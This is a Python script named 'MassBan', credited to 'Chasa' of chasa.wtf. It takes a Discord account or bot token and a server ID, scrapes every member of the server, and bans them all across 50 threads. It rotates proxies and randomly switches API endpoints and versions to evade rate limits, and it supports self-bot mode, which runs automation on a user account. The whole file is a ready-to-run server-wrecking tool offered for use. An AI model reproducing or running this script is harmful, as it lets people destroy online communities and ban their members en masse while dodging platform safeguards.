# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import requests
import threading
import time
from colorama import Fore, init
import ctypes
import os
import random

def title(content):
    ctypes.windll.kernel32.SetConsoleTitleW(content)
title(f"[MassBan | chasa.wtf] Bootup")

init(autoreset=True)
mainc = Fore.LIGHTMAGENTA_EX
white = Fore.RESET
gray = Fore.LIGHTBLACK_EX

BOT = False

colon = f"{gray}[{mainc}:{gray}]{white}"
bad = f"{gray}[{mainc}-{gray}]{white}"
good = f"{gray}[{mainc}+{gray}]{white}"
os.system("cls")
print(f"""{mainc}
                           _                 
                          ( )                
  ___ ___    _ _  ___  ___| |_     _ _  ___  
/  _   _  \/ _  )  __)  __)  _ \ / _  )  _  |
| ( ) ( ) | (_| |__  \__  \ |_) ) (_| | ( ) |
(_) (_) (_)\__ _)____/____/_ __/ \__ _)_) (_)

Made by Chasa | Visit chasa.wtf for more tools.
""")

while True:
    print(f"{colon} Token: ", end="")
    TOKEN = input()
    headers = {'Authorization': f'{TOKEN}'}
    r = requests.get(f"https://discord.com/api/users/@me", headers=headers)
    if r.status_code == 200:
        print(f"{colon} Enabled Self-Bot Mode. ITS RECOMMENDED YOU USE A BOT TO AVOID THE ACCOUNT BEING DISABLED!")
        break
    else:
        headers = {'Authorization': f'Bot {TOKEN}'}
        r = requests.get(f"https://discord.com/api/users/@me", headers=headers)
        if r.status_code == 200:
            BOT = True
            print(f"{colon} Enabled Bot Mode.")
            break
        print(f"{bad} Invalid Token.")
print(f"{colon} Guild ID: ", end="")
GUILD_ID = input()
while True:
    print(f"{colon} Proxy File: ", end="")
    PROXIES_FILE = input()
    try:
        proxies = open(PROXIES_FILE, "r").read().splitlines()
    except:
        print(f"{bad} Invalid File.")
    else:
        break

intents = discord.Intents.all()
intents.members = True

if BOT == False:
    headers = {'Authorization': f'{TOKEN}'}
else:
    headers = {'Authorization': f'Bot {TOKEN}'}

bot = commands.Bot(command_prefix="399439", self_bot=True, intents=intents)
bot.remove_command("help")

bans = 0
fails = 0

def split_list(alist, wanted_parts=1):
    length = len(alist)
    return [ alist[i*length // wanted_parts: (i+1)*length // wanted_parts] 
             for i in range(wanted_parts) ]

async def main():
    global GUILD_ID
    while True:
        print(f"{colon} Fetching Guild...")
        try:
            guild = await bot.fetch_guild(int(GUILD_ID))
        except:
            print(f"{bad} Guild not Found. Join the Guild, and re-enter the ID.")
            print(f"{colon} Guild ID: ", end="")
            GUILD_ID = input()
        else:
            if guild == None:
                print(f"{bad} Guild not Found. Join the Guild, and re-enter the ID.")
                print(f"{colon} Guild ID: ", end="")
                GUILD_ID = input()
            else:
                break
    print(f"{colon} Scraping all members...")
    members = await guild.chunk()
    print(f"{good} Scraped {len(members)} member(s) in total.")
    print(f"{colon} Press ENTER to start banning in {guild.name}.")
    input()
    members = split_list(members, 50)
    for x in members:
        threading.Thread(target=massban, args=(GUILD_ID, x,)).start()

def massban(guild, members):
    global bans
    global fails
    global proxies
    time.sleep(2.5)
    for member in members:
        while True:
            canary = ""
            if random.randint(0,1) == 1:
                canary = "canary."
            proxy = random.choice(proxies)
            try:
                r = requests.put(f"https://{canary}discord.com/api/v{random.randint(8,9)}/guilds/{guild}/bans/{member.id}", headers=headers, proxies={"http": proxy})
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        bans += 1
                        title(f"[MassBan | chasa.wtf] Bans: {bans} // Fails: {fails}")
                    else:
                        fails += 1
                        title(f"[MassBan | chasa.wtf] Bans: {bans} // Fails: {fails}")
                        print(r.text)
                    break
            except:
                try:
                    proxies.remove(proxy)
                except:
                    pass

os.system("cls")
print(f"""{mainc}
                           _                 
                          ( )                
  ___ ___    _ _  ___  ___| |_     _ _  ___  
/  _   _  \/ _  )  __)  __)  _ \ / _  )  _  |
| ( ) ( ) | (_| |__  \__  \ |_) ) (_| | ( ) |
(_) (_) (_)\__ _)____/____/_ __/ \__ _)_) (_)

Made by Chasa | Visit chasa.wtf for more tools.
""")
print(f"{colon} Booting up..")
async def setup():
    await bot.wait_until_ready()
    await main()
bot.loop.create_task(setup())
bot.run(TOKEN, bot=BOT)
